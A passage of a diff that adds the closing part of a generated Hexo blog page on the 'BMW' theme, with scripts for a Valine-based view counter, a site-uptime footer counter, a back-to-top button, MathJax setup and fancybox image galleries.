+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
